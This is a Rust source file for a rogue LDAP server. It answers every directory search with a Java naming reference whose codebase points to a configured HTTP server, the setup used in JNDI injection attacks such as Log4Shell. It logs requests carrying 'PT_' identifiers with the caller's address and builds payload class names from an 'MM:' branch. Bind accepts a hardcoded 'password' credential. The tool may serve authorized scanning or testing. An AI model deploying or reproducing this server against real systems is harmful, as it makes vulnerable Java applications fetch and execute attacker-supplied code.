use futures::SinkExt;
use futures::StreamExt;
use std::convert::TryFrom;
use tokio::net::TcpStream;
use tokio_util::codec::{FramedRead, FramedWrite};
use std::net::SocketAddr;
use ldap3_proto::simple::*;
use ldap3_proto::LdapCodec;
use std::io;
use crate::common::{ServerCfg, Access};

pub struct LdapSession {
    dn: String,
    cfg : ServerCfg,
}

impl LdapSession {
    pub fn do_bind(&mut self, sbr: &SimpleBindRequest) -> LdapMsg {
        if sbr.dn == "cn=Directory Manager" && sbr.pw == "password" {
            self.dn = sbr.dn.to_string();
            sbr.gen_success()
        } else if sbr.dn == "" && sbr.pw == "" {
            self.dn = "Anonymous".to_string();
            sbr.gen_success()
        } else {
            sbr.gen_invalid_cred()
        }
    }

    pub fn do_search(&mut self, lsr: &SearchRequest,  peer_addr : &io::Result<SocketAddr>) -> Vec<LdapMsg> {
        let mut base = lsr.base.to_string();
        base.remove(0);
        let parts : Vec<&str> = base.split(":").collect();
       
        let mut name = base.clone();
        if name.starts_with("PT_"){
            let id = &name[3..].to_string();
            self.cfg.caches.add_access_for_id(id, Access::new_ldap(peer_addr, self.cfg.port, lsr.base.to_string()));
            
        }
        if (parts.len() == 3) && (parts[0] =="MM") {
            let addr_str = parts[1].replace(".", "_");
            let name_parts : Vec<&str> = vec![&parts[0], &addr_str, &parts[2]]; 
            name = name_parts.join("_").to_string();
      }
        //println!("the base is {}", name);
        vec![
            lsr.gen_result_entry(LdapSearchResultEntry {
                dn: "cn=hello,dc=example,dc=com".to_string(),
                attributes: vec![
                    LdapPartialAttribute {
                        atype: "javaClassName".to_string(),
                        vals: vec![name.clone()],
                    },
                    LdapPartialAttribute {
                        atype: "objectClass".to_string(),
                        vals: vec!["javaNamingReference".to_string()],
                    },
                    LdapPartialAttribute {
                        atype: "javaCodeBase".to_string(),
                        vals: vec![format!("http://{}:{}/", self.cfg.rsc.addr, self.cfg.port)],
                    },
                    LdapPartialAttribute {
                        atype: "javaFactory".to_string(),
                        vals: vec![name],
                    },
                ],
            }),
            lsr.gen_success(),
        ]
    }

    pub fn do_whoami(&mut self, wr: &WhoamiRequest) -> LdapMsg {
        wr.gen_success(format!("dn: {}", self.dn).as_str())
    }
}

pub async fn handle_client(socket: TcpStream, cfg : ServerCfg) {
    let peer_addr = socket.peer_addr();
    let (r, w) = tokio::io::split(socket);
    let mut reqs = FramedRead::new(r, LdapCodec);
    let mut resp = FramedWrite::new(w, LdapCodec);

    let mut session = LdapSession {
        dn: "Anonymous".to_string(),
        cfg
    };

    while let Some(msg) = reqs.next().await {
        let server_op = match msg
            .map_err(|_e| ())
            .and_then(|msg| ServerOps::try_from(msg))
        {
            Ok(v) => v,
            Err(_) => {
                let _err = resp
                    .send(DisconnectionNotice::gen(
                        LdapResultCode::Other,
                        "Internal Server Error",
                    ))
                    .await;
                let _err = resp.flush().await;
                return;
            }
        };

        let result = match server_op {
            ServerOps::SimpleBind(sbr) => vec![session.do_bind(&sbr)],
            ServerOps::Search(sr) => session.do_search(&sr, &peer_addr),
            ServerOps::Unbind(_) => {
                // No need to notify on unbind (per rfc4511)
                return;
            }
            ServerOps::Whoami(wr) => vec![session.do_whoami(&wr)],
        };

        for rmsg in result.into_iter() {
            if let Err(_) = resp.send(rmsg).await {
                return;
            }
        }

        if let Err(_) = resp.flush().await {
            return;
        }
    }
    // Client disconnected
}
